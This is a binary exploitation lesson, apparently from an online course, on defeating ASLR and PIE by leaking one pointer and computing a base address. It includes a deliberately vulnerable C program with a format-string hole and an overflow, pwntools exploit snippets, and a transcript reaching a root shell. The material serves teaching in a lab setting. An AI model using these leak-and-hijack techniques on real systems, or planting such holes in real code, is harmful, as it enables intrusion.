---
title: "Lesson 5.3: ASLR and PIE, why you need an address leak"
image:
  path: /assets/img/covers/pwn-5-3-aslr-pie-address-leak.webp
  alt: "ASLR and PIE, why you need an address leak"
date: 2022-11-24 01:24:00 +0700
categories: ["Binary Exploitation", "Pwn · Mitigations"]
tags: [pwn, aslr, pie]
render_with_liquid: false
---

When ASLR and PIE are both on, you no longer know the address of anything in advance. This lesson explains why leaking exactly one address is enough to rebuild the whole map, and how to compute a base from that leak.

![Computing a base address from one leaked pointer](/assets/img/pwn/pwn-5-3-aslr-pie-address-leak.svg)
_base = leak minus a known offset; every other symbol in that object is then base plus its own offset._

Part: 5 (Mitigations) | Time: about 55 minutes reading plus lab | Difficulty: medium

**Prerequisites:** Lesson 5.1 (mitigations), Lesson 1.3 (ELF, GOT/PLT), Lesson 3.2 (overflow, offset). Helpful: Lesson 7.1 (format string).

**Tools:** gdb + pwndbg (vmmap), pwntools, checksec, readelf.

## Goals

By the end of this lesson you can tell ASLR and PIE apart with no confusion left. You understand why leaking one address gives you the rest of an entire object. You can compute the image base and the libc base from a leak using the formula base = leak minus offset. You can use pwntools' `elf.address` so every symbol adds the base automatically.

## 1. Theory

### ASLR and PIE, one more time to be clear

These two ideas get mixed up constantly, so here is a last clear pass.

- ASLR belongs to the kernel. Every time a process loads, the kernel randomizes the base of the stack, the heap, and the mmap region (where libc and other .so files get mapped). Turned on and off through `/proc/sys/kernel/randomize_va_space`. Applies to every process on the system.
- PIE is a property of the binary, chosen by you at compile time (the binary is built as ET_DYN). When on, even the main image (.text, .data, GOT, the program's own functions) gets loaded at a random base whenever ASLR is on. No-PIE (ET_EXEC) keeps the main image fixed at 0x400000.

Put together, there are two common situations.

- ASLR on, binary no-PIE: libc, stack, and heap are all random, but the program's own code stays still at 0x400000. You can still ret2win or use an internal gadget with a hardcoded address. You only need a leak when you want to touch libc.
- ASLR on, binary PIE: everything is random. Using even the program's own function or gadget requires leaking the image base first.

### Why one leak is enough

This is the core idea behind every exploit facing ASLR/PIE, understand this and you have half of Part 6 already. ASLR randomizes the base, but it does not shuffle the layout inside one object. Within a single run, every address belonging to the same object (the same binary image, or the same libc) sits a known, constant distance apart, because the offsets between them were fixed at compile/link time.

So the process is always to leak one address whose offset you know, then compute as follows.

```
base = leak - known_offset
any_address = base + its_own_offset
```

For example, if you leak the runtime address of `puts` in libc, you look up the offset of `puts` in that libc file, subtract it to get the libc base, then add the offset of `system` and of the string `/bin/sh` to get their addresses for this run.

### The invariant low 12 bits

ASLR randomizes in units of a page, 0x1000, so the lowest 12 bits (the last 3 hex digits) of every address never change between runs. The practical consequence: an object's base always ends in 0x000 (page-aligned), which is a quick way to check whether a leak is correct. If `base & 0xfff != 0`, you subtracted the wrong offset. And because the low 12 bits are fixed, sometimes you only need to brute force one byte to get halfway there.

### Ways to get a leak

- Format string: with `printf(user)`, use `%p` at the right offset to print a pointer out. If that pointer lands inside the program's `.text`, you infer the image base; if it is a libc pointer (for example, the saved return address of `main` is often `__libc_start_call_main` plus a fixed offset), you infer the libc base.
- Through the GOT: the GOT holds the resolved runtime addresses of libc functions. If you have a primitive that prints like `puts(got_entry)`, you print out the libc address of that function. The details are in Lesson 6.2. A PLT entry points back into the main image's code, so leaking it gives you the image base instead.

One thing to watch when choosing what to leak: leaking a stack pointer only tells you about the stack, it does not help you derive the image base or the libc base, because the stack is a different object. To get the image base, leak a pointer that belongs to the image; to get the libc base, leak a pointer that belongs to libc.

## 2. Demo

Environment: Ubuntu 24.04, glibc 2.39, gcc 13.3.0. Source, build.sh, exploit, and transcript (real output, run with ASLR on) are in the Lab section below.

Source `leak.c`, a PIE binary with a format string hole.

```c
#include <stdio.h>
#include <stdlib.h>
void win(){ system("/bin/sh"); }
int main(){
    char buf[128];
    setvbuf(stdout, 0, 2, 0);
    printf("addr of main = %p\n", main);   // deliberately exposed, to illustrate computing a base
    fgets(buf, sizeof buf, stdin);
    printf(buf);                            // the real format string leak
    puts("");
    fgets(buf, sizeof buf, stdin);          // overflow
    return 0;
}
```

Build with defaults, and PIE turns on automatically.

```bash
gcc -fno-stack-protector -o leak leak.c
checksec --file=leak        # expect: PIE enabled
readelf -h leak | grep Type # Type: DYN
```

In gdb, `vmmap` shows the real image base to compare against. The base changes every run (unless ASLR is off). Here is the formula for computing the image base from the leaked `main` address.

```python
from pwn import *

elf = context.binary = ELF('./leak')
io = process('./leak')

io.recvuntil(b'addr of main = ')
leaked_main = int(io.recvline().strip(), 16)

elf.address = leaked_main - elf.sym['main']    # sets the base for the WHOLE ELF
log.success(f'image base = {hex(elf.address)}')
log.info(f'win        = {hex(elf.sym.win)}')   # elf.sym.win already has the base added
assert elf.address & 0xfff == 0, 'base must be page-aligned, otherwise the offset was wrong'
```

The key pwntools trick: assigning `elf.address = base` makes every later `elf.sym[...]`, `elf.got[...]`, `elf.plt[...]` automatically add the base. You work with symbols, pwntools handles the arithmetic.

In reality you do not get a free `printf("addr of main = %p")` line like that. You have to leak through the `printf(buf)` hole yourself. The approach: fire `%p` at several offsets, find a value that looks like an image address (compare against `vmmap` in gdb), identify what it is the address of (for example a return address inside .text), then subtract its known offset.

```python
io.sendline(b'%17$p')               # try several offsets, say 17 happens to print a return address in .text
io.recvuntil(b'0x')
leak = int(io.recvline().strip(), 16)
# suppose we determined leak = elf.address + 0x11c3 (offset found via gdb/disasm)
elf.address = leak - 0x11c3
```

On the real lab binary from the Lab section below, the way to determine the offset is to compare each `%N$p` against `/proc/<pid>/maps` (or `vmmap` in pwndbg). The measured result is that `%15$p` prints `image_base + 0x1244` (which is the saved return address of `vuln`, meaning the address of the instruction right after `call vuln` in `main`, a `.text` pointer), and `%17$p` is a libc pointer (`libc_base + 0x2a1ca`). So `image_base = leak - 0x1244`. Here is the real output from running `python3 exploit.py` with ASLR on.

```
[+] leak        = 0x6165914f7244
[+] image base  = 0x6165914f6000
[*] win         = 0x6165914f7179
===SHELL_OK===
uid=0(root) gid=0(root) groups=0(root)
```

Run three times, the base differs every time (`0x6165914f6000`, `0x617ec3076000`, `0x62d5a8295000`) and is always page-aligned (the low 12 bits are `000`), and all three still get a shell. The full transcript is in the Lab section below.

When debugging, it helps to turn ASLR off for a stable address to inspect: `setarch -R ./leak` or run gdb with `set disable-randomization on` (gdb already defaults to this). But the final exploit has to run with ASLR on, so always test it several times outside gdb to make sure it is not succeeding by luck on one fixed layout.

Leaking the libc base follows the same idea, only you leak a libc pointer instead and subtract the offset of the matching symbol in the libc file. Lesson 6.2 does this fully, including identifying the correct libc version.

## 3. Lab

- Task: the PIE binary described in the Lab section below (`src.c`, built with `build.sh`: `gcc -fno-stack-protector -fpie -pie -fcf-protection=none -O0 -g -o lab src.c`) has a format string hole and an overflow right after it. There is no convenient printed address.
- Goal: leak a pointer, compute the image base, then overflow to jump to `win` or an internal gadget.
- A working reference solution (ASLR on), with the real transcript, is in the Lab section below.
- Hints, in steps:
  - Hint 1: use `vmmap` in pwndbg to know the real image base, then probe which `%N$p` prints a value inside that range.
  - Hint 2: figure out what the leaked pointer is the address of, subtract its exact offset to get the base.
  - Hint 3: check `base & 0xfff == 0`; if it is off, you subtracted the wrong offset.
- Check yourself: can you state why the offset in `base = leak - offset` is a constant, and why leaking a stack pointer does not help you compute the image base?

## 4. Key takeaways

- ASLR (kernel) randomizes libc/stack/heap; PIE (binary) extends that randomization to the main image too.
- Leaking just one address of an object is enough to derive the whole object.
- base = leak minus a known offset, and the base is always page-aligned (low 12 bits are 000).
- Whichever pointer you leak, you can only compute the base of the object that pointer belongs to.
- Assign `elf.address` in pwntools so symbols add the base automatically.

## 5. Common pitfalls

- Confusing ASLR with PIE. Seeing ASLR on and assuming you must leak the base of a no-PIE binary, when it is still sitting at 0x400000. Check the PIE line of checksec to know whether you need to leak the image at all.
- Subtracting the wrong offset. Using an offset measured on a different binary or libc version, producing a base that is off, and every address after that is wrong. Check with the page-alignment condition.
- Debugging with ASLR habitually off. gdb disables randomization by default, addresses stay fixed, and it is easy to accidentally hardcode one. Run many times outside gdb to be sure.
- Leaking the wrong object's pointer. Taking a stack pointer and using it to compute the image base, or taking an image pointer and using it to compute the libc base. The pointer has to match the object you need.

## 6. Further reading

- Linux kernel ASLR documentation and how PIE gets loaded (ELF ET_DYN, the ld.so interpreter).
- How `pwntools.ELF.address` works, and the `sym`, `got`, `plt` attributes.
- Lesson 6.1 (ret2libc) and Lesson 6.2 (leaking libc through the GOT) to put a leak to real use.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 5.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/5.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/5.3/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/5.3/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/5.3/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>
